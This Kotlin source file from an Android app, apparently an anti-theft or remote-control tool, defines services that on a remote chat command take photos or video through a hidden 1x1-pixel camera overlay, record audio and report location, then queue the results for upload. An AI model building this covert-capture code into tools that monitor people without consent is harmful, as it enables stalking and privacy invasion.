package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.util.Log
import android.view.SurfaceView
import android.view.WindowManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class CameraService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_TYPE = "type"
        const val EXTRA_CAMERA = "camera"
        const val EXTRA_FLASH = "flash"
        const val EXTRA_QUALITY = "quality"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(
            context: Context,
            type: String,
            camera: String?,
            flash: Boolean?,
            quality: Int?,
            duration: Int?,
            chatId: String?
        ) {
            val intent = Intent(context, CameraService::class.java).apply {
                putExtra(EXTRA_TYPE, type)
                putExtra(EXTRA_CAMERA, camera)
                putExtra(EXTRA_FLASH, flash)
                quality?.let { putExtra(EXTRA_QUALITY, it) }
                duration?.let { putExtra(EXTRA_DURATION, it) }
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra(EXTRA_TYPE) ?: "photo"
        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "front"
        val quality = intent?.getIntExtra(EXTRA_QUALITY, if (type == "photo") 1080 else 480) ?: if (type == "photo") 1080 else 480
        val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
        val duration = intent?.getIntExtra(EXTRA_DURATION, if (type == "video") 60 else 0) ?: if (type == "video") 60 else 0
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)

        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Camera Service")
            .setContentText("Taking photo/video...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        startForeground(2, notification)

        scope.launch {
            var winMgr: WindowManager? = null
            var surfaceView: SurfaceView? = null
            try {
                winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
                surfaceView = SurfaceView(this@CameraService)
                val lp = WindowManager.LayoutParams(
                    1, 1,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    android.graphics.PixelFormat.TRANSLUCENT
                )
                withContext(Dispatchers.Main) {
                    winMgr.addView(surfaceView, lp)
                }
                val file = File(
                    getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                    "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}"
                )
                val captured = CameraBackgroundHelper.takePhotoOrVideo(
                    this@CameraService,
                    surfaceView.holder,
                    type,
                    camera,
                    flash,
                    quality,
                    duration,
                    file
                )
                withContext(Dispatchers.Main) {
                    winMgr.removeView(surfaceView)
                }
                if (captured && file.exists() && file.length() > 0) {
                    Log.d("CameraService", "Saved $type to ${file.absolutePath}")
                    chatId?.let { UploadManager.queueUpload(file, it, type) }
                } else {
                    Log.e("CameraService", "Failed to capture $type or file is empty!")
                    chatId?.let {
                        val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_error_${System.currentTimeMillis()}.txt")
                        FileOutputStream(errorFile).use { out ->
                            out.write("Failed to capture $type".toByteArray())
                        }
                        UploadManager.queueUpload(errorFile, it, "text")
                    }
                }
            } catch (e: Exception) {
                Log.e("CameraService", "Error: $e")
                chatId?.let {
                    val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_error_${System.currentTimeMillis()}.txt")
                    FileOutputStream(errorFile).use { out ->
                        out.write("Exception during $type capture: ${e.message}".toByteArray())
                    }
                    UploadManager.queueUpload(errorFile, it, "text")
                }
            } finally {
                try {
                    if (winMgr != null && surfaceView != null) {
                        withContext(Dispatchers.Main) {
                            winMgr.removeViewImmediate(surfaceView)
                        }
                    }
                } catch (_: Exception) {}
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

class AudioService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, duration: Int = 60, chatId: String? = null) {
            val intent = Intent(context, AudioService::class.java).apply {
                putExtra(EXTRA_DURATION, duration)
                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
            }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)

        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Audio Service")
            .setContentText("Recording audio...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .build()
        startForeground(3, notification)

        scope.launch {
            try {
                val file = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_audio_${System.currentTimeMillis()}.m4a")
                val recorded = AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
                if (recorded && file.exists() && file.length() > 0) {
                    Log.d("AudioService", "Saved audio to ${file.absolutePath}")
                    chatId?.let { UploadManager.queueUpload(file, it, "audio") }
                } else {
                    Log.e("AudioService", "Failed to record audio or file is empty!")
                    chatId?.let {
                        val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_error_${System.currentTimeMillis()}.txt")
                        FileOutputStream(errorFile).use { out ->
                            out.write("Failed to record audio".toByteArray())
                        }
                        UploadManager.queueUpload(errorFile, it, "text")
                    }
                }
            } catch (e: Exception) {
                Log.e("AudioService", "Error: $e")
                chatId?.let {
                    val errorFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_error_${System.currentTimeMillis()}.txt")
                    FileOutputStream(errorFile).use { out ->
                        out.write("Exception during audio recording: ${e.message}".toByteArray())
                    }
                    UploadManager.queueUpload(errorFile, it, "text")
                }
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

class LocationService : Service() {
    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.Default + job)

    companion object {
        const val EXTRA_CHAT_ID = "chat_id"

        fun start(context: Context, chatId: String? = null) {
            val intent = Intent(context, LocationService::class.java)
            chatId?.let { intent.putExtra(EXTRA_CHAT_ID, it) }
            context.startForegroundService(intent)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)

        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Location Service")
            .setContentText("Acquiring location...")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .build()
        startForeground(4, notification)

        scope.launch {
            try {
                val location = LocationBackgroundHelper.getLastLocation(this@LocationService)
                if (location != null) {
                    Log.d("LocationService", "Location: ${location.latitude}, ${location.longitude}")
                    if (chatId != null) {
                        val mapsUrl = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.txt")
                        FileOutputStream(file).use { out ->
                            out.write(mapsUrl.toByteArray())
                        }
                        UploadManager.queueUpload(file, chatId, "location")
                    }
                } else {
                    Log.e("LocationService", "Location not found")
                    if (chatId != null) {
                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}_unavailable.txt")
                        FileOutputStream(file).use { out ->
                            out.write("Location unavailable".toByteArray())
                        }
                        UploadManager.queueUpload(file, chatId, "location")
                    }
                }
            } catch (e: Exception) {
                Log.e("LocationService", "Error: $e")
                if (chatId != null) {
                    val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}_exception.txt")
                    FileOutputStream(file).use { out ->
                        out.write("Exception getting location: ${e.message}".toByteArray())
                    }
                    UploadManager.queueUpload(file, chatId, "location")
                }
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

class ForegroundActionService : Service() {
    private var overlayView: OverlayCameraView? = null
    private var job: Job? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("ForegroundActionService", "onCreate called")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        Log.d("ForegroundActionService", "onStartCommand received: action=$action, chatId=$chatId")
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            try {
                val notification = androidx.core.app.NotificationCompat.Builder(this@ForegroundActionService, NotificationHelper.CHANNEL_ID)
                    .setContentTitle("Remote Control Service")
                    .setContentText("Running background actions...")
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .build()
                startForeground(1, notification)

                when (action) {
                    "photo" -> {
                        Log.d("ForegroundActionService", "Handling camera action: photo")
                        handleCameraAction("photo", intent, chatId)
                    }
                    "video" -> {
                        Log.d("ForegroundActionService", "Handling camera action: video")
                        handleCameraAction("video", intent, chatId)
                    }
                    "audio" -> {
                        Log.d("ForegroundActionService", "Handling audio recording")
                        handleAudioRecording(intent, chatId)
                    }
                    "location" -> {
                        Log.d("ForegroundActionService", "Handling location")
                        handleLocation(chatId)
                    }
                    "ring" -> {
                        Log.d("ForegroundActionService", "Handling ring")
                        handleRing()
                    }
                    "vibrate" -> {
                        Log.d("ForegroundActionService", "Handling vibrate")
                        handleVibrate()
                    }
                    else -> Log.e("ForegroundActionService", "Unknown action: $action")
                }
            } catch (e: Exception) {
                Log.e("ForegroundActionService", "Error in action $action", e)
            } finally {
                removeCameraOverlay()
                Log.d("ForegroundActionService", "Stopping service")
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
        showCameraOverlay()
        val cameraFacing = intent?.getStringExtra("camera") ?: "front"
        val quality = intent?.getIntExtra("quality", if (type == "photo") 1080 else 480) ?: if (type == "photo") 1080 else 480
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val duration = intent?.getIntExtra("duration", if (type == "video") 60 else 0) ?: if (type == "video") 60 else 0
        val outputFile = File(cacheDir, generateFileName(type, quality))
        Log.d("ForegroundActionService", "Camera params: type=$type, cameraFacing=$cameraFacing, flash=$flash, quality=$quality, duration=$duration, outputFile=${outputFile.absolutePath}")
        val result: Boolean
        try {
            result = CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = overlayView!!.holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = duration,
                file = outputFile
            )
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Camera error: $e")
            chatId?.let {
                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
                FileOutputStream(errorFile).use { out ->
                    out.write("Exception during $type capture: ${e.message}".toByteArray())
                }
                UploadManager.queueUpload(errorFile, it, "text")
            }
            return
        } finally {
            removeCameraOverlay()
        }
        if (result && outputFile.exists() && outputFile.length() > 0 && chatId != null) {
            Log.d("ForegroundActionService", "Queueing camera result for upload: $outputFile")
            UploadManager.queueUpload(outputFile, chatId, type)
        } else if (chatId != null) {
            val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
            FileOutputStream(errorFile).use { out ->
                out.write("Failed to capture $type".toByteArray())
            }
            UploadManager.queueUpload(errorFile, chatId, "text")
        }
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
        val duration = intent?.getIntExtra("duration", 60) ?: 60
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        Log.d("ForegroundActionService", "Audio params: duration=$duration, outputFile=${outputFile.absolutePath}")
        try {
            val recorded = AudioBackgroundHelper.recordAudio(this, outputFile, duration)
            if (recorded && outputFile.exists() && outputFile.length() > 0 && chatId != null) {
                Log.d("ForegroundActionService", "Queueing audio result for upload: $outputFile")
                UploadManager.queueUpload(outputFile, chatId, "audio")
            } else if (chatId != null) {
                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
                FileOutputStream(errorFile).use { out ->
                    out.write("Failed to record audio".toByteArray())
                }
                UploadManager.queueUpload(errorFile, chatId, "text")
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Audio error: $e")
            if (chatId != null) {
                val errorFile = File(cacheDir, "remote_error_${nowString()}.txt")
                FileOutputStream(errorFile).use { out ->
                    out.write("Exception during audio recording: ${e.message}".toByteArray())
                }
                UploadManager.queueUpload(errorFile, chatId, "text")
            }
        }
    }

    private suspend fun handleLocation(chatId: String?) {
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                Log.e("ForegroundActionService", "Location unavailable")
                if (chatId != null) {
                    val file = File(cacheDir, "location_${nowString()}_unavailable.txt")
                    FileOutputStream(file).use { out ->
                        out.write("Location unavailable".toByteArray())
                    }
                    UploadManager.queueUpload(file, chatId, "location")
                }
                return
            }
            val mapsUrl = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
            val locationFile = File(cacheDir, "location_${nowString()}.txt")
            FileOutputStream(locationFile).use { out ->
                out.write(mapsUrl.toByteArray())
            }
            if (chatId != null) {
                Log.d("ForegroundActionService", "Queueing location result for upload: $locationFile")
                UploadManager.queueUpload(locationFile, chatId, "location")
            }
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Location error: $e")
            if (chatId != null) {
                val file = File(cacheDir, "location_${nowString()}_exception.txt")
                FileOutputStream(file).use { out ->
                    out.write("Exception getting location: ${e.message}".toByteArray())
                }
                UploadManager.queueUpload(file, chatId, "location")
            }
        }
    }

    private fun handleRing() {
        val duration = 5
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
            val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
            ringtone.play()
            Handler(Looper.getMainLooper()).postDelayed({
                ringtone.stop()
                audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
                Log.d("ForegroundActionService", "Ring completed")
            }, (duration * 1000).toLong())
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Ring error: $e")
        }
    }

    private fun handleVibrate() {
        val duration = 2000L
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(duration)
            }
            Log.d("ForegroundActionService", "Vibrate triggered")
        } catch (e: Exception) {
            Log.e("ForegroundActionService", "Vibrate error: $e")
        }
    }

    private fun showCameraOverlay() {
        if (overlayView == null) {
            overlayView = OverlayCameraView(this)
            overlayView?.addToWindow()
            Log.d("ForegroundActionService", "Camera overlay shown")
        }
    }
    private fun removeCameraOverlay() {
        overlayView?.removeFromWindow()
        overlayView = null
        Log.d("ForegroundActionService", "Camera overlay removed")
    }
    override fun onDestroy() {
        job?.cancel()
        removeCameraOverlay()
        Log.d("ForegroundActionService", "onDestroy called")
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        fun generateFileName(type: String, quality: Int): String {
            val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(Date())}.mp4"
            } else {
                "${type}_${sdf.format(Date())}.jpg"
            }
        }
        fun nowString(): String = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
    }
}